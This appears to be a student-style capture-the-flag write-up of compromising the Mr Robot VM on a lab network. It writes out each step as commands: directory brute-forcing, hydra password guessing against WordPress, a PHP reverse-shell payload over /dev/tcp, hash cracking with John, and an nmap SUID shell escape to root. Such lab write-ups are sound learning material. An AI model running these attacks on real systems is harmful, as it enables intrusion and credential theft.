# Mr Robot Penetration testing report

# Overview
A penetration testing report on MR ROBOT VM CFT, demonstrating credential attack, web exploitation (WordPress), reverse shell and privilege escalation technique.

## Lab environment
Attacker machine (Kali Linux) ip - 192.168.1.5
Target machine (Mr Robot VM)  ip - 192.168.1.8
Both the machine were configured to same NAT Network.

## Reconnaissance
### Host discovery 
Used arp-scan to find the ip address of the target machine. 
Command used ```sudo arp-scan -l```
![arp scan](./image/arp%20scan.png)
### Service and OS detection
Used command ```namp -sV -O 192.168.1.8``` to find the running services and underlying operating system.
![nmap scan](./image/nmap%20scan%20service%20and%20OS%20detection.png)

### Bruteforcing Directories
Used command ```sudo dirb http://192.168.1.8``` to find the hidden files and directories within the web server. 
![dirb scan](./image/dirb%20scan.png)

## Web Enumeration
After the dirb scan I found a file named ```http://192.168.1.8/robots.txt``` and then I manually inspected the file.
### Key findings 
```fsocity.dic``` 
```key-1-of-3.txt``` 
![first key](./image/first%20key.png)

### Wordpress login page discovery
dirb scan also flagged a wp login page ```http://192.168.1.8/wp-login```. That got me into a target login page and also wordlist fsocity.dic to use against it. 

## User Enumeration: Cracking the login id
Used burpsuit intruder tool to determine the user name from the wordlist 'fsocity.dic'
### Key findings
Invalid Users: Triggered an error invalid user and password.
Valid User ("Elliot"): Triggered a specific message: "The password you entered for the username Elliot is incorrect."

## Password Attack
In order to get the password for the user "Elliot" I used hydra to bruteforce attack
### Wordlist optimization and cleanup
To make the attack faster and more efficient I used command ```sort /home/kali/mrrobot/fsocity.dic | uniq > ufsocity.txt``` 
### The Attack (hydra)
Used command ``` sudo hydra -vv -l Elliot -P  ufsocity.txt 192.168.1.8 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is Incorrect' ``` to crack the password successfully.
![Hydra crack](./image/hydra%20password%20crack.png)

## Reverse Shell
After successfully logged into the website then I navigated to Appearance > Editor and selected the 404 Template since its easy to trigger. 
### Payload used 
    <?php
      exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.5/443 0>&1'");
    ?>
### Netcat listener
 ```nc -lvp 443 ``` Successfully captured reversed shell as deamon@linux user.

## Post Exploitation 
After gaining access as deamon@linux user I nevigated to home directory and found a folder named robot. But still can't access the second key.

### Key findings
```key-2-of-3.txt```
```password.raw-md5```

## Cracking the password.raw-md5 
After getting the hash for the password.raw-md5 by ```cat /home/robot/password.raw-md5``` then used john the ripper to crack the password by using command ```john --format=raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt```

## TTY shell stabilization
Used ```python -c 'import pty; pty.spawn("/bin/bash")'``` to spawn a pseudo-terminal (PTY). This allowed me to improve the terminal and interact with system's password prompt.
This time I can access as robot by entering the password cracked from the md5 hash and finally can access ```key-2-of-3.txt```

## privilege escalation to find SUID Binaries
For escalating previledge to the root user I began by searching the file system for binaries with the SUID (Set User ID) bit enabled.
Used command ```find / -perm /4000 -type f 2>/tmp/2``` to locate all files where the SUID bit is set (-perm /4000)
### Key findings 
```/usr/local/bin/nmap```

## Exploiting Nmap SUID
After identifying the ```/usr/local/bin/nmap``` I lunched nmap interactive mode by using command ```nmap --interactive```

## Final Key 
Inside the nmap promt I used shell escape command ```nmap> !sh``` and ran ```whoami``` to confirm that privilege have been escalated to root user.
With full system control I navigated to the root directory 
    ```cd /root
       ls
       cat key-3-of-3.txt```
and found the final key.
